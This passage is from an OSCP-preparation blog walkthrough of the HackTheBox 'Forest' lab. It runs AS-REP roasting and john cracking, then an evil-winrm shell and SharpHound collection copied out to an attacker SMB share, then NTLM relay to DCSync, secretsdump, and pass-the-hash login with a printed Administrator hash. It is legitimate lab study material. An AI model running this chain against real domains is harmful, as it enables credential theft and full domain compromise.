class="hljs-comment">[HealthMailbox0659cc1]</span> rid:<span class="hljs-comment">[0x478]</span>                     <br>user:<span class="hljs-comment">[sebastien]</span> rid:<span class="hljs-comment">[0x479]</span>                                <br>user:<span class="hljs-comment">[lucinda]</span> rid:<span class="hljs-comment">[0x47a]</span>                                  <br>user:<span class="hljs-comment">[svc-alfresco]</span> rid:<span class="hljs-comment">[0x47b]</span>                             <br>user:<span class="hljs-comment">[andy]</span> rid:<span class="hljs-comment">[0x47e]</span>                                     <br>user:<span class="hljs-comment">[mark]</span> rid:<span class="hljs-comment">[0x47f]</span>                                     <br>user:<span class="hljs-comment">[santi]</span> rid:<span class="hljs-comment">[0x480]</span> <br></code></pre></td></tr></table></figure>
+
+<h2 id="Shell-Gain"><a href="#Shell-Gain" class="headerlink" title="Shell-Gain"></a>Shell-Gain</h2><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>​	With above actions,we can get a list of user.</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">Administrator<br>lucinda<br>svc-alfresco<br>andy<br><span class="hljs-selector-tag">mark</span><br>santi<br></code></pre></td></tr></table></figure>
+
+<p>​	And the port 88 is open.We can try to use <code>AS-REP Roastring attack</code>.Typically,kerberoasting  requires credentials on the domain to authenticate with.However,if an account have the property for “Do not require Kerberos preauthentication” or <code>UF_DONT_REQUIRE_PREAUTH</code> set to true.That attack could play a role.</p>
+<p>​	We can use <code>GetNPUsers.py</code> from impacket to launch a attack.And get hash for svc-alfresco.</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ .<span class="hljs-regexp">/GetNPUsers.py -dc-ip 10.10.10.161 -usersfile ~/</span>RedTeamNote<span class="hljs-regexp">/Walkthrough/</span>Forest<span class="hljs-regexp">/users -format john -outputfile hash4user -no-pass htb.local/</span><br><br><span class="hljs-variable">$krb5asrep</span><span class="hljs-variable">$svc</span>-alfresco@HTB.LOCAL:<span class="hljs-number">36</span>d75ad85a1792d93e9a0f9eb8d654f1<span class="hljs-variable">$bbe1411147e7cfbf3c6201ce152f35cadf0d53aa248ff5671b4f46909f03dae560e7062ef44767a5f2186db42278874d8aecb70fc1d343a9a16d0557d25df5d6bf5b232700673e8e5c68f3747c972f671e3cbe6d123aca0568041e8d6af953a5f0f936cd84731e4c12bd3f516fda3aca7042ce1ca98b6c851546e85cb9130028c700cc542500ea3a75454b309724eda4da0ba0f702cfd0f433c948a1ff0342681d8106b23458b77ecbb034731366ce07585d6ef9be49baab42a1768f98d10a5a93cc2f3af1b309c2cf815de28a4370c0c8699f1bf785ace775fd88b291aa5b63390e32f397d9</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Crack-the-Hash"><a href="#Crack-the-Hash" class="headerlink" title="Crack the Hash"></a>Crack the Hash</h3><p>​	use john to crack it.</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">john hash4user --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt<br><br><br><br>┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/RedTeamNote/</span>Walkthrough/Forest]<br>└─$ john  --show hash4user        <br><span class="hljs-variable">$krb5asrep</span><span class="hljs-variable">$svc</span>-alfresco@HTB.LOCAL:s3rvice<br></code></pre></td></tr></table></figure>
+
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/RedTeamNote/</span>Walkthrough/Forest]<br>└─<span class="hljs-variable">$ </span>evil-winrm -i <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> -u svc-alfresco<span class="hljs-variable">@HTB</span>.LOCAL<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312212800728.png" srcset="/img/loading.gif" lazyload class="">
+
+<h2 id="Privesc-to-Administrator"><a href="#Privesc-to-Administrator" class="headerlink" title="Privesc to Administrator"></a>Privesc to Administrator</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><h4 id="Sharphound"><a href="#Sharphound" class="headerlink" title="Sharphound"></a>Sharphound</h4><p>With shell,we can use sharphound.exe to collect information for Bloodhound.</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&gt; upload <span class="hljs-regexp">/home/</span>sollupus<span class="hljs-regexp">/RedTeamNote/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/</span>Tools<span class="hljs-regexp">/Sharphood/</span>SharpHound.exe c:\tmp\sharp.exe<br></code></pre></td></tr></table></figure>
+
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213156062.png" srcset="/img/loading.gif" lazyload class="">
+
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213327732.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>Then get it to local machine.I use smbserver to get that target.</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ .<span class="hljs-regexp">/smbserver.py share /</span>home<span class="hljs-regexp">/sollupus/</span>RedTeamNote<span class="hljs-regexp">/Walkthrough/</span>Forest -smb2support -username a -password a<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*Evil-WinRM* PS C:<span class="hljs-string">\tmp&gt;net</span> use <span class="hljs-string">\\10.10.16.8\share</span> /u:a a<br>*Evil-WinRM* PS C:<span class="hljs-string">\tmp&gt;copy</span> <span class="hljs-number">20230312045852_</span>BloodHound.zip <span class="hljs-string">\\10.10.16.8\share\</span><br>*Evil-WinRM* PS C:<span class="hljs-string">\tmp&gt;del</span> <span class="hljs-number">20230312045852_</span>BloodHound.zip<br>*Evil-WinRM* PS C:<span class="hljs-string">\tmp&gt;net</span> use /d <span class="hljs-string">\\10.10.16.8\share</span><br></code></pre></td></tr></table></figure>
+
+<p>Then upload it to BloodHound.And use that quey to find the shortest way from owner to administrator.</p>
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312213915439.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>With that graph,we can know owner is belong to group <code>EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL</code>,which means that you have privilege to modify domain ACL.</p>
+<h3 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM-relay"></a>NTLM-relay</h3><p>1.Firstly, add <code>svc-alfresco</code> to group <code>Exchange Windows Permissions</code>.</p>
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312214603499.png" srcset="/img/loading.gif" lazyload class="">
+
+
+
+<p>2.Then Run the <code>ntlmrelayx.py</code> man-in-the-middle (“mitm”) tool with the <code>--escalate-user</code> flag. What this will essentially do is when it identifies the login  attempt of the “svc-alfresco” user on the same network, it will mitm to  automatically check the user privileges, and if it can modify the domain ACL, it will modify the user permissions to add <code>Replication-Get-Changes-All</code> privileges to the user account, which can do a DCSync.</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ .<span class="hljs-regexp">/ntlmrelayx.py -t ldap:/</span><span class="hljs-regexp">/10.10.10.161 --escalate-user svc-alfresco </span><br></code></pre></td></tr></table></figure>
+
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312214801416.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>3.Then, we will do a random authentication using the <code>svc-alfresco</code>  account. In this case, I used <code>psexec.py</code> to do an authenticate attempt against my own Kali box.</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ .<span class="hljs-regexp">/psexec.py htb.local/</span>svc-alfresco:s3rvice@<span class="hljs-number">10.10</span>.<span class="hljs-number">16.8</span><br></code></pre></td></tr></table></figure>
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312215108184.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>​	Obviously,<code>psexec.py</code> will failed because there is no smb server runing in my kali box.However,<code>ntlmrelayx.py</code> will capture authentication attempt of the <code>htb.local/svc-alfresco</code> to the <code>ldap://10.10.10.161</code>.And since it is valid credentials to the Forces box, it will successfully authenticate and escalate our privileges to add <code>Replication-Get-Changes-All</code>.</p>
+<h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><p>Then we can use <code>secretdump.py</code> to dump the Administrator’s NTML hash.</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ .<span class="hljs-regexp">/secretsdump.py htb.local/</span>svc-alfresco:s3rvice@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br></code></pre></td></tr></table></figure>
+<img src="/2023/03/12/Road-to-OSCP-4-Forest/image-20230312215522843.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>Then use evil-winrm ,we can connect to forest box as Administrator.</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(sollupus㉿kali)-[~<span class="hljs-regexp">/…/</span>WeaponizingTools<span class="hljs-regexp">/Domain-penetration/im</span>packet/examples]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> -u Administrator -H <span class="hljs-number">32693</span>b11e6aa90eb43d32c72a07ceea6 <br></code></pre></td></tr></table></figure>
+
+<p>And that means we get this Dc,and root.txt is in Administrator’s desktop.</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OSCP%E5%A4%87%E8%80%83/">#OSCP备考</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Road-to-OSCP-4-Forest</div>
+      <div>http://example.com/2023/03/12/Road-to-OSCP-4-Forest/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>So1Lupus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/03/24/CVE-2023-21839--Weblogic-%E5%A4%8D%E7%8E%B0/" title="CVE-2023-21839--Weblogic-复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CVE-2023-21839--Weblogic-复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/07/Road-to-OSCP-3-Soccer/" title="Road to OSCP-3 Soccer">
+                        <span class="hidden-mobile">Road to OSCP-3 Soccer</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022029346号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
